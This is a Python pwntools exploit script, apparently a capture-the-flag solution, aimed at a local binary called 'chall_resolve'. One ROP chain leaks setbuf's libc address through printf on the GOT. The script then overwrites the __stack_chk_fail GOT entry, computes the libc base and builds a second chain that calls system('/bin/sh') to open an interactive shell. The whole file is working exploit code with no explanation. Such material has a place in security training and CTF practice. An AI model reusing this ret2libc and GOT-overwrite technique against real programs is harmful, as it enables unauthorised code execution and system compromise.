#!/usr/bin/env python3
from pwn import *

bin_file = './chall_resolve'
context(os = 'linux', arch = 'amd64')
# context(terminal = ['tmux', 'splitw', '-v'])
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_main           = binf.functions['main'].address
addr_got_setbuf     = binf.got['setbuf']
addr_got_scf        = binf.got['__stack_chk_fail']
addr_bss            = binf.bss()

libc = binf.libc
offset_libc_setbuf  = libc.functions['setbuf'].address

def attack(conn, **kwargs):
    rop = ROP(binf)
    rop.raw(rop.ret)
    rop.printf(addr_got_setbuf)
    rop.raw(rop.ret)
    rop.main()

    conn.sendlineafter('>> ', pack(0xdeadbeef) + bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_got_scf)))
    conn.sendafter('>> ', str(hex(rop.r12_r13_r14_r15.address)))
    conn.send(pack(0xcafebabe))

    addr_libc_setbuf    = unpack(conn.recv(6), 'all')
    libc.address = addr_libc_setbuf - offset_libc_setbuf
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(addr_libc_str_sh)

    conn.sendlineafter('>> ', bytes(rop))
    conn.sendlineafter('>> ', str(hex(addr_bss)))
    conn.sendlineafter('>> ', '0')

def main():
    # conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
